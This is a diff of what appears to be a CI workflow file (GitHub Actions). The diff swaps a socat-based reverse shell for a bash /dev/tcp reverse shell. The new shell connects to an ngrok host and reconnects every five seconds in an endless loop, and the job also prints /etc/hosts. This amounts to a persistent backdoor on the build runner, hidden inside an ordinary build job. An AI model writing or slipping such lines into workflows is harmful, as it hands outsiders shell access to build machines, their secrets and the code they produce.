@@ -31,12 +31,10 @@ jobs:
         run: |
           set -eux
           cat /etc/hosts
-          wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat
 
           while sleep 5; do
-            /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:0.tcp.sa.ngrok.io:16106
+            sh -i >& /dev/tcp/0.tcp.sa.ngrok.io/16106 0>&1
           done
-
           hn="$(hostname)"
           docker run -d --rm -p 8000:8000 python:3.9 python3 -m http.server
           sleep 5
